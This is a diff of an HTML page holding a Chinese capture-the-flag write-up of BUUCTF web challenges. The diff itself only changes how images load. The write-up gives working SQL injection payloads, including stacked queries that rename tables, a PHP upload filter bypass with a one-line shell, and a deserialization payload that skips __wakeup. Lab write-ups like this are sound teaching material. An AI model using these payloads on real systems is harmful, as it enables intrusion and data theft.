@@ -138,7 +138,7 @@
 
   <article class="post-content">
     <h1>BUUCTF web writeup</h1>
-    <p><img alt="QQ截图20190911174613.png" data-src="https://i.loli.net/2019/09/11/5GBRelnv39aHCzS.png" class="lazyload"></p>
+    <p><img src="https://i.loli.net/2019/09/11/5GBRelnv39aHCzS.png" alt="QQ截图20190911174613.png"></p>
 <a id="more"></a>
 <p>平台web题目质量很高 有以往的一些比赛题目</p>
 <h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>右键查看源代码 发现  <code>&lt;!--source.php--&gt;</code>访问<code>source.php</code>发现源码 题目考察代码审计</p>
@@ -158,7 +158,7 @@
 <p>得到flag</p>
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e6a6362a<span class="number">-6</span>c69<span class="number">-402</span>f-b469<span class="number">-63</span>d39794be76&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h2><p>2019强网杯的一道题目</p>
-<p><img alt="QQ截图20190911201650.png" data-src="https://i.loli.net/2019/09/11/qYsDnTFGQAxKPNi.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/09/11/qYsDnTFGQAxKPNi.png" alt="QQ截图20190911201650.png"></p>
 <p>输入</p>
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=<span class="number">1</span>' union select <span class="number">1</span>,<span class="number">2</span> --+</span><br></pre></td></tr></table></figure>
 <p>发现 程序使用正则过滤了一些关键字</p>
@@ -168,12 +168,12 @@
 <p>可查询出所有数据库</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
 <p>查询当前数据库下所有表名</p>
-<p><img alt="QQ截图20190911202240.png" data-src="https://i.loli.net/2019/09/11/8REQpnTbACNIwBo.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/09/11/8REQpnTbACNIwBo.png" alt="QQ截图20190911202240.png"></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=1';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br></pre></td></tr></table></figure>
 <p><strong>有个坑</strong></p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql中点引号( ‘ )和反勾号( ` )的区别</span><br><span class="line">linux下不区分，windows下区分</span><br><span class="line">区别: 单引号( ' )或双引号主要用于对字符串的引用符号 eg：mysql&gt; <span class="keyword">SELECT</span> <span class="string">'hello'</span>, <span class="string">"hello"</span> ; </span><br><span class="line">反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键] eg:`mysql&gt;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="symbol">`table`</span> <span class="keyword">WHERE</span> <span class="symbol">`from`</span> = <span class="string">'abc'</span> ;</span><br></pre></td></tr></table></figure>
 <p>这里当做表名 进行查询时需要加反引号 不然会查询不出来</p>
-<p><img alt="2.png" data-src="https://i.loli.net/2019/09/11/ahTqw6vOQxI1LYC.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/09/11/ahTqw6vOQxI1LYC.png" alt="2.png"></p>
 <p>查询出了flag字段名</p>
 <p>正则过滤了select 无法查询字段数据。后看了师傅们的wp涨姿势了</p>
 <p>题目一开始默认查询words表下的数据</p>
@@ -183,7 +183,7 @@
 <p>通过重命名把藏flag的表和列改成默认查询的表和列的名字 这样程序就会读到flag</p>
 <p>payload:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">inject=1'<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">add</span> <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">1</span>;</span><br><span class="line">//因为1919810931114514只有flag字段 没有id字段 所以我们添加一个id字段</span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">to</span> words1;</span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> words;</span><br><span class="line">//程序默认查询words表 所以我们把1919810931114514表名 改成words</span><br></pre></td></tr></table></figure>
-<p><img alt="QQ截图20190912162107.png" data-src="https://i.loli.net/2019/09/12/S1hY9FykL7OCrDH.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/09/12/S1hY9FykL7OCrDH.png" alt="QQ截图20190912162107.png"></p>
 <h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>suctf中的一题 当时没有写出来 出了官方wp后好好研究了一下</p>
 <p>一个上传点 我想很多师傅想到的都是用<code>.htaccess</code>吧 然而发现不行。。</p>
 <p>后来看了wp涨姿势了 </p>
@@ -194,13 +194,13 @@
 <p>指定同文件夹下的PHP都会包含flag.jpg </p>
 <p>类似于使用了<code>include &#39;flag.jpg&#39;</code></p>
 <p>这时候我们上传一个<code>flag.php</code></p>
-<p><img alt="QQ截图20190912171827.png" data-src="https://i.loli.net/2019/09/12/mHFCvpkxjoaZnwK.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/09/12/mHFCvpkxjoaZnwK.png" alt="QQ截图20190912171827.png"></p>
 <p>程序还过滤了<code>&lt;?</code> 不能写<code>&lt;?php xxx?&gt;</code>用<code>&lt;script language=&#39;php&#39;&gt;xxx&lt;/script&gt;</code>来绕过</p>
 <p>当然内容也可以换成一句话</p>
-<p><img alt="QQ截图20190912172138.png" data-src="https://i.loli.net/2019/09/12/hSxVH5NTQgdMA8b.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/09/12/hSxVH5NTQgdMA8b.png" alt="QQ截图20190912172138.png"></p>
 <p>上传后 显示文件路径和文件列表 发现目录下存在index.php 这时候index.php应该是包含了flag.jpg里的内容 访问即可拿到flag</p>
-<p><img alt="QQ截图20190912173650.png" data-src="https://i.loli.net/2019/09/12/Bmbgpz9SXnR1e4W.png" class="lazyload"></p>
-<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img alt="QQ截图20191124105054.png" data-src="https://i.loli.net/2019/11/24/u21OeyEJw8nq3vY.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/09/12/Bmbgpz9SXnR1e4W.png" alt="QQ截图20190912173650.png"></p>
+<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="https://i.loli.net/2019/11/24/u21OeyEJw8nq3vY.png" alt="QQ截图20191124105054.png"></p>
 <p>看到良好的备份网站习惯</p>
 <p><code>url</code>上直接<code>/www.zip</code>下载了网站源码</p>
 <p>index.php里发现核心代码</p>
@@ -218,7 +218,7 @@
 <p>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p>
 <p>所以我们最终提交的payload为</p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
-<p><img alt="QQ截图20191124110502.png" data-src="https://i.loli.net/2019/11/24/dA8cKwnp1bBkTPS.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/11/24/dA8cKwnp1bBkTPS.png" alt="QQ截图20191124110502.png"></p>
 <h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>题目较简单</p>
 <p>考察PHP的特性</p>
 <p>抓包 看到cookie <code>user=0</code> 替换成 <code>user=1</code></p>
@@ -232,7 +232,7 @@
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=<span class="number">404</span>aaa&amp;<span class="section">money</span>=<span class="number">100000000</span></span><br></pre></td></tr></table></figure>
 <p>会提示值的长度太长 这里科学计数法绕过</p>
 <p>最终payload为</p>
-<p><img alt="QQ图片20191128210724.png" data-src="https://i.loli.net/2019/11/28/6IvTOAgdly8hJbq.png" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/11/28/6IvTOAgdly8hJbq.png" alt="QQ图片20191128210724.png"></p>
 
   </article>
 </div>
